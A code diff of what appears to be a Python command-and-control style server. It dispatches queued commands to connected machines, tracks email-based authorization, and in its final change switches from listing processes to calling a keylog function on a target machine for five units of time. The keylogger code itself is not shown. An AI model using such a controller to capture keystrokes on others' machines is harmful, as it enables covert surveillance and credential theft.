@@ -39,9 +39,6 @@ for i in range(MAX_CONNECTION):
 handler.__init__()
 print(handler.list_ip())
 
-def despawn(conn):
-    conn.sendall(b'QUIT')
-    conn.close()
 
 # Sample summon
 def summon(conn, addr):
@@ -50,8 +47,9 @@ def summon(conn, addr):
         # Blocking
         command_to_run = handler.action_dictionary[addr].get()
         command_to_run(conn)
+        conn.sendall(b'QUIT') # Quit current command
         break # For testing only 1 command
-    despawn(conn)
+    conn.close()
 
 
 # Sample authorize
@@ -60,10 +58,24 @@ def authorize(email, ip):
         handler.auth_dict[email] = True
         handler.email_ip_dict[email] = ip
 
+def check_return_ip(email):
+    if email in handler.auth_dict and handler.auth_dict[email]:
+        return handler.email_ip_dict[email]
+    else:
+        return None
+
+def disconnect(email):
+    if email in handler.auth_dict and handler.auth_dict[email]:
+        handler.auth_dict[email] = False
+        handler.email_ip_dict[email] = None
+
+
+# Sample connection (1 machine)
 target = handler.conn_ip_list[0]
 
 t = threading.Thread(target = summon, args = target)
 t.start()
 
-handler.list_process(target[1])
+# handler.list_process(target[1])
+handler.keylog(target[1], 5)
 
